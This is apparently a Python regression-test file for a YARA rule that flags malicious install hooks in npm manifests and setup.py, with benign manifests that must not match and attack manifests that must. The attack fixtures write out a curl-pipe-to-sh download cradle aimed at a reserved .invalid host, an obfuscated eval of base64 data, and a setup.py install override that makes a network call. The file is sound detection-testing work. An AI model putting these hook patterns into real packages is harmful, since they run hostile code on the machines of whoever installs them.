"""Regression tests pinning the package-manifest false positives fixed in rule v2.

Version 1 of `developer_malicious_package_hooks.yar` matched its execution and
network primitives anywhere in the file. Measured against a benign npm tree
(n=1755, `docs/detections/evaluation-package-manifests.json`), that produced a
0.51% false-positive rate concentrated entirely on popular HTTP libraries: the
manifest declared a `prepare` hook for its build step, and the words `curl`,
`wget`, or `Buffer` appeared in an unrelated field such as `keywords`.

Each benign case below is a reduced form of a manifest that actually fired.
Each attack case is a variant produced by `SupplyChainCraftsman`. Both halves
are asserted so a future widening of the rule cannot silently trade recall for
precision, or the reverse.
"""

from __future__ import annotations

import json
import unittest
from pathlib import Path

import yara

ROOT = Path(__file__).resolve().parents[1]
RULE_PATH = ROOT / "rules" / "yara" / "developer_malicious_package_hooks.yar"
RESULTS_PATH = ROOT / "docs" / "detections" / "evaluation-package-manifests.json"


def manifest(**fields) -> bytes:
    return json.dumps(fields).encode("utf-8")


# Reduced forms of manifests that produced false positives under rule v1.
# The hook value is a legitimate build step; the trigger words sit elsewhere.
BENIGN_MANIFESTS = {
    "undici_keywords_mention_transfer_tools": manifest(
        name="undici",
        version="6.28.0",
        keywords=["fetch", "http", "https", "curl", "wget"],
        scripts={"prepare": "husky install"},
    ),
    "got_description_mentions_transfer_tools": manifest(
        name="got",
        version="11.8.6",
        description="Human-friendly requests, a lighter alternative to curl and wget",
        scripts={"prepare": "npm run build"},
    ),
    "node_fetch_mentions_buffer_type": manifest(
        name="node-fetch",
        version="2.7.0",
        description="A light-weight module that brings window.fetch to Node.js, Buffer aware",
        scripts={"prepare": "tsc"},
    ),
    "keyv_mentions_buffer_type": manifest(
        name="keyv",
        version="4.5.4",
        description="Simple key-value storage with Buffer serialization support",
        scripts={"prepare": "npm run compile"},
    ),
    "plain_package_no_hooks": manifest(
        name="lodash",
        version="4.17.21",
        scripts={"test": "mocha"},
    ),
    "hook_calls_local_script": manifest(
        name="internal-tool",
        version="1.0.0",
        scripts={"postinstall": "node scripts/build-native.js"},
    ),
}

# Attack variants that must continue to match. Hosts use RFC 2606 reserved
# names and no payload is live.
ATTACK_MANIFESTS = {
    "postinstall_decoded_evaluation": (
        b'{"name":"ai-bench","scripts":{"postinstall":'
        b'"node -e \\"eval(Buffer.from(\'dmFyIGE9MQ==\',\'base64\').toString())\\""}}'
    ),
    "preinstall_download_cradle": (
        b'{"name":"take-home","scripts":{"preinstall":'
        b'"curl -s https://recruitment-review.stage.invalid/check.sh | sh"}}'
    ),
    "prepare_concatenated_global_lookup": (
        b'{"name":"llm-wrapper","scripts":{"prepare":'
        b'"node -e \\"const f = global[\'ev\' + \'al\']; '
        b'f(Buffer[\'from\'](\'dmFyIGE9MQ==\', \'base64\').toString())\\""}}'
    ),
    "setup_py_command_override": (
        b"from setuptools import setup\n"
        b"import urllib.request\n"
        b"class Custom(install):\n"
        b"  def run(self):\n"
        b"    urllib.request.urlopen('https://stage.invalid')\n"
        b"    install.run(self)\n"
        b"setup(cmdclass={'install': Custom})"
    ),
}


class ManifestFalsePositiveRegressionTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.rules = yara.compile(filepath=str(RULE_PATH))

    def test_benign_manifests_do_not_match(self):
        for label, data in BENIGN_MANIFESTS.items():
            with self.subTest(manifest=label):
                self.assertEqual(
                    self.rules.match(data=data),
                    [],
                    f"{label} matched; rule v1 regression reintroduced",
                )

    def test_attack_manifests_still_match(self):
        for label, data in ATTACK_MANIFESTS.items():
            with self.subTest(manifest=label):
                matches = self.rules.match(data=data)
                self.assertEqual(len(matches), 1, f"{label} no longer matches")
                self.assertEqual(
                    matches[0].rule, "Suspicious_Developer_Package_Lifecycle_Hooks"
                )

    def test_hook_value_scope_is_the_discriminator(self):
        """The same primitive inside vs. outside a hook value must differ."""
        outside = manifest(
            name="edge-case", keywords=["curl"], scripts={"prepare": "npm run build"}
        )
        inside = manifest(
            name="edge-case", scripts={"prepare": "curl https://stage.invalid/x -o x"}
        )
        self.assertEqual(self.rules.match(data=outside), [])
        self.assertEqual(len(self.rules.match(data=inside)), 1)


class ManifestEvaluationResultsTests(unittest.TestCase):
    """The published measurement must stay consistent with the current rule."""

    def test_results_file_is_present_and_well_formed(self):
        self.assertTrue(
            RESULTS_PATH.is_file(),
            "measurement file missing; run tools/evaluate_manifest_corpus.py",
        )
        results = json.loads(RESULTS_PATH.read_text(encoding="utf-8"))
        for key in (
            "scanned_manifests",
            "false_positives",
            "false_positive_rate",
            "wilson_ci_95",
            "corpus_label",
            "not_measured",
        ):
            self.assertIn(key, results)

    def test_published_measurement_reflects_the_fixed_rule(self):
        results = json.loads(RESULTS_PATH.read_text(encoding="utf-8"))
        self.assertGreaterEqual(
            results["scanned_manifests"],
            1000,
            "a false-positive bound from a small corpus is not a bound worth publishing",
        )
        self.assertEqual(
            results["false_positives"],
            0,
            "published measurement predates the v2 rule; re-run the evaluator",
        )

    def test_recall_is_explicitly_not_claimed(self):
        results = json.loads(RESULTS_PATH.read_text(encoding="utf-8"))
        joined = " ".join(results["not_measured"]).lower()
        self.assertIn("recall", joined)


if __name__ == "__main__":
    unittest.main()
